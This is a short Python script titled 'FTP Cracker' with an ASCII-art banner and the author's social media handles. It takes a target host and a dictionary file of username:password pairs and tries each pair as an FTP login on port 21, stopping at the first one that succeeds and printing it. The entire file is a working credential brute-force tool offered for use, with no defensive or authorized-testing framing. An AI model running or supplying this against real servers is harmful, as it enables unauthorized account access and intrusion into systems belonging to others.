#!/usr/bin/python3
import ftplib
from colorama import Fore
from os import system, name
def clear():
    if name == 'nt' :
        system('cls')
    else :
        system('clear')
clear()
print(Fore.GREEN + """
███████╗████████╗██████╗░  ░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
██╔════╝╚══██╔══╝██╔══██╗  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
█████╗░░░░░██║░░░██████╔╝  ██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
██╔══╝░░░░░██║░░░██╔═══╝░  ██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
██║░░░░░░░░██║░░░██║░░░░░  ╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░░░░░░░╚═╝░░░╚═╝░░░░░  ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
Created By : Mr.Bug Hunter

Telegram  ID 1 : @bug_hunter_us
Telegram  ID 2 : @Mr_Bug_HunTer
Instagram ID   : mr_bug_hunter
""")
def connect(host,username,password):
    ftp = ftplib.FTP()
    print("-"*50)
    print(Fore.RED + "[-] " + Fore.WHITE + "TRYING -> {}:{}".format(username,password))
    try:
        ftp.connect(host,21,timeout=5)
        ftp.login(username,password)
        return True
    except ftplib.error_perm:
        return False
host = input(Fore.GREEN + "[+] " + Fore.WHITE + "HOST : ")
dic = input(Fore.GREEN + "[+] " + Fore.WHITE + "DICTIONERY FILE : ")
for userpass in open(dic):
    userpass = userpass.strip("\n")
    username = userpass.split(":")[0]
    password = userpass.split(":")[1]
    if connect(host,username,password) :
        print("-"*50)
        print(Fore.GREEN + "USERNAME : {}\nPASSWORD : {}".format(username,password))
        break
input(Fore.GREEN + "[+] " + Fore.WHITE + "Press ENTER To Exit")
